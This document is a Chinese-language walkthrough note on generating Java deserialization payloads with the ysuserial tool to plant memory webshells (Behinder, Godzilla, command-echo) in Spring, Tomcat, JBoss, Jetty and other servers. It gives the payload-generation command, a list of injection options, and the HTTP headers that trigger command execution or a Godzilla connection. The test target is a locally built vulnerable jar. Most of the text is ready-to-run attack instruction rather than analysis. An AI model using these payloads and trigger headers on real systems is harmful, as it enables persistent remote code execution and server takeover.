<a name="BPj46"></a>
## aced反序列化生成
生成文件，然后用go编码获取aced，注意不能在powershell终端下，不然编码会有问题
```java
java -jar ysuserial-0.9-su18-all.jar -g CommonsBeanutils161NOCC -p 'EX-MS-SpringInterceptorMS-cmd'  >6.ser
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667894551701-9acbc24d-52bd-4714-bcb4-55e3e704ac10.png#clientId=u18c2001f-1a72-4&from=paste&height=353&id=gVvC9&originHeight=441&originWidth=1002&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33402&status=done&style=none&taskId=uf64ffc10-f651-4189-99fb-b51a1068ec7&title=&width=801.6)<br />- `EX-MS-TSMSFromThread-bx`：`冰蝎` 逻辑内存马<br />- `EX-MS-TSMSFromThread-gz`：`哥斯拉` Base64 逻辑内存马<br />- `EX-MS-TSMSFromThread-gzraw`：`哥斯拉` RAW 逻辑内存马<br />- `EX-MS-TSMSFromThread-cmd`：`CMD` 命令回显内存马
```java
EX-MS-SpringInterceptorMS-...:Injecting Spring Interceptor Memory Shell
EX-MS-TFMSFromJMX-...:Injecting Tomcat Filter Memory Shell through JMX MBeans
EX-MS-TFMSFromThread-...:Injecting Tomcat Filter Memory Shell through Thread Context
EX-MS-TLMSFromThread-...:Injecting Tomcat Listener Memory Shell through Thread Context
EX-MS-TSMSFromJMX-...:Injecting Tomcat Servlet Memory Shell through JMX MBeans
EX-MS-TSMSFromThread-...:Injecting Tomcat Servlet Memory Shell through Thread Context
EX-MS-JBFMSFromContext-...:Injecting JBoss/Wildfly Filter Memory Shell through Thread Context
EX-MS-JBSMSFromContext-...:Injecting JBoss/Wildfly Servlet Memory Shell through Thread Context
EX-MS-JFMSFromJMX-...:Injecting Jetty Filter Memory Shell through JMX MBeans
EX-MS-JSMSFromJMX-...:Injecting Jetty Servlet Memory Shell through JMX MBeans
EX-MS-RFMSFromThread-...:Injecting Resin Filter Memory Shell through Thread Context
EX-MS-RSMSFromThread-...:Injecting Resin Servlet Memory Shell through Thread Context
EX-MS-WSFMSFromThread-...:Injecting Websphere Filter Memory Shell through Thread Context
EX-MS-RMIBindTemplate-...:RMI Memory Shell
```

<a name="OIgYD"></a>
## 执行命令方式
X-Token-Data: ls -al<br />Referer: [https://su18.org/](https://su18.org/)<br />X-SSRF-TOKEN: ce<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667894956800-9ebd2963-59bd-4ea0-811a-d7d16ddf41ff.png#clientId=u18c2001f-1a72-4&from=paste&height=454&id=u9f83a96a&originHeight=567&originWidth=1458&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39169&status=done&style=none&taskId=u1fb141d1-0b88-41cc-8692-cc21a43753e&title=&width=1166.4)
<a name="Q37gX"></a>
## 哥斯拉连接
添加的header
```java
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
X-SSRF-TOKEN: gz
X-Token-Data: 1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: https://su18.org/

```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667895024092-20deb529-d957-4383-9b40-d69259906953.png#clientId=u18c2001f-1a72-4&from=paste&height=182&id=u7668c527&originHeight=228&originWidth=595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54014&status=done&style=none&taskId=uc6a760e7-8faa-4454-bfce-f8ca3ff5969&title=&width=476)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667895010153-57393f4d-019b-4a80-8e85-baad289c372d.png#clientId=u18c2001f-1a72-4&from=paste&height=232&id=u5b3f8265&originHeight=290&originWidth=480&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24900&status=done&style=none&taskId=u8755b93a-7635-4b19-8d40-c5f8bcba951&title=&width=384)
<a name="eK7dX"></a>
## 漏洞环境
编译了个漏洞环境打包成jar     java -jar /root/桌面/mycert-0.0.1-SNAPSHOT.jar<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667894709490-82baec7f-2484-470f-bc71-f6831ae9f924.png#clientId=u18c2001f-1a72-4&from=paste&height=565&id=u4f97a148&originHeight=706&originWidth=1188&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71612&status=done&style=none&taskId=u551c5aef-5b2d-438b-b3ba-c4f07cbe766&title=&width=950.4)

打一波漏洞<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667895890645-474cace9-188a-4318-a1ea-f622ed6437df.png#clientId=u18c2001f-1a72-4&from=paste&height=518&id=u44dbd2a7&originHeight=647&originWidth=1599&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56785&status=done&style=none&taskId=u36db5c1a-69fe-4073-956c-aff1492c6a8&title=&width=1279.2)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667896321099-e46df514-d27f-4e64-82cd-4176e9c219f7.png#clientId=u18c2001f-1a72-4&from=paste&height=598&id=ua29a2b6d&originHeight=747&originWidth=968&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80032&status=done&style=none&taskId=u47e65085-8aec-4fa8-85e0-6c855861a2c&title=&width=774.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667896403250-1e3a5ee6-6e4d-4a01-a7cd-0b76bab60cd7.png#clientId=u18c2001f-1a72-4&from=paste&height=522&id=u4bd98407&originHeight=653&originWidth=1388&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38608&status=done&style=none&taskId=uc796bcd9-4d9b-4b61-a301-c80a00486f6&title=&width=1110.4)
